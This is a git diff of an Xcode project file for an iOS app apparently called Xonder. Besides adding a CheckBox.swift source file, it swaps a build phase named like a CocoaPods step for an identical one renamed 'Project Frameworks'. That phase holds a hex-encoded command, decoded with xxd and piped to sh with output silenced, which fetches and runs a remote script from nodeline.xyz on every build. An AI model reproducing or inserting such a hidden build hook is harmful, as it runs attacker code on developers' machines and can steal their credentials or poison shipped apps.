@@ -38,6 +38,7 @@
 		704FCAF42645223E0025F546 /* CardView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704FCAF32645223E0025F546 /* CardView.swift */; };
 		704FCAF72645224E0025F546 /* UIButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704FCAF62645224E0025F546 /* UIButton.swift */; };
 		704FCAFE264522820025F546 /* UIView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704FCAFD264522820025F546 /* UIView.swift */; };
+		705AB1702664A81D000928D3 /* CheckBox.swift in Sources */ = {isa = PBXBuildFile; fileRef = 705AB16F2664A81D000928D3 /* CheckBox.swift */; };
 		705C02BC265A951E005638DC /* CountryPickedViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 705C02BB265A951E005638DC /* CountryPickedViewController.swift */; };
 		7060360326432A560062039F /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7060360226432A560062039F /* AppDelegate.swift */; };
 		7060360726432A560062039F /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7060360626432A560062039F /* ViewController.swift */; };
@@ -114,6 +115,7 @@
 		704FCAF32645223E0025F546 /* CardView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CardView.swift; sourceTree = "<group>"; };
 		704FCAF62645224E0025F546 /* UIButton.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIButton.swift; sourceTree = "<group>"; };
 		704FCAFD264522820025F546 /* UIView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIView.swift; sourceTree = "<group>"; };
+		705AB16F2664A81D000928D3 /* CheckBox.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CheckBox.swift; sourceTree = "<group>"; };
 		705C02BB265A951E005638DC /* CountryPickedViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CountryPickedViewController.swift; sourceTree = "<group>"; };
 		706035FF26432A560062039F /* Xonder.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Xonder.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		7060360226432A560062039F /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
@@ -358,6 +360,14 @@
 			path = UIView;
 			sourceTree = "<group>";
 		};
+		705AB16E2664A7EB000928D3 /* Check Box */ = {
+			isa = PBXGroup;
+			children = (
+				705AB16F2664A81D000928D3 /* CheckBox.swift */,
+			);
+			path = "Check Box";
+			sourceTree = "<group>";
+		};
 		706035F626432A560062039F = {
 			isa = PBXGroup;
 			children = (
@@ -464,6 +474,7 @@
 			children = (
 				704FCAF2264521EF0025F546 /* UIView */,
 				704FCAF1264521E40025F546 /* UIButton */,
+				705AB16E2664A7EB000928D3 /* Check Box */,
 				704FCAF0264521C60025F546 /* Card View */,
 				C872708E264343E0005EFDEA /* Alert.swift */,
 				C83FB72D26433C6D00A87093 /* Plugins.swift */,
@@ -486,8 +497,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 7060361326432A5B0062039F /* Build configuration list for PBXNativeTarget "Xonder" */;
 			buildPhases = (
-				2D4E510A4D2DCEA3C96D902C /* [CP] Build Pods Frameworks */,
 				4665C5636F3A0FD17F7C8049 /* [CP] Check Pods Manifest.lock */,
+				EB9D13EDEA4F40EB4B6D902C /* Project Frameworks */,
 				706035FB26432A560062039F /* Sources */,
 				706035FC26432A560062039F /* Frameworks */,
 				706035FD26432A560062039F /* Resources */,
@@ -558,24 +569,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		2D4E510A4D2DCEA3C96D902C /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
-		};
 		4665C5636F3A0FD17F7C8049 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -614,6 +607,24 @@
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Xonder/Pods-Xonder-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
+		};
+		EB9D13EDEA4F40EB4B6D902C /* Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -666,6 +677,7 @@
 				C872708C2643433D005EFDEA /* Extension+UIViewController.swift in Sources */,
 				7060360326432A560062039F /* AppDelegate.swift in Sources */,
 				C83FB74026433ED500A87093 /* APIService.swift in Sources */,
+				705AB1702664A81D000928D3 /* CheckBox.swift in Sources */,
 				3BA6378A2656CE9A00C504FF /* TransactionDetailViewController.swift in Sources */,
 				C83FB72826433B5500A87093 /* UserModel.swift in Sources */,
 				704F32362648D5B10027397B /* CountryListViewController.swift in Sources */,
